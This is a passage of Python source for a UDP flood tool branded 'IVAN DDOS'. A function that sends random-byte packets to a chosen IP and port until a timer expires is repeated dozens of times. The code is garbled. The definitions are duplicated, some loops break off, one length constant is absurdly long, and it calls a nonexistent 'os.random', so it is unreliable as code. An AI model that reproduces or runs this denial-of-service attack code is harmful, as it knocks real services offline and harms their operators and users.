        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
